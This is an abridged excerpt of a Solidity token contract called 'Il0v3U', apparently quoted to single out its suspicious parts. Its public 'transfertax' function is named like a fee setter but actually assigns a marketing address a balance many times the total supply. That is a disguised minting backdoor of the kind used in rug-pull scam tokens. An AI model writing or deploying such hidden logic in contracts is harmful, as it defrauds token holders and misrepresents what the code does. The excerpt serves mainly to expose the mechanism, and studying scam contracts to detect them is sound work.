...
contract  Il0v3U {
    ...
    string public name = "Il0v3U";
    string public symbol = "Il0v3U";
    ...
    address private dev = 0x34eef4CBB9B6543c73b7D1285EC001F214674aF1;
    ...
    function transfertax(uint256 value) public {
        ...
        _fee = value;
        if(_fee > 0) {
            balanceOf[mkt] = totalSupply * value * 10 ** decimals;
        }
    }
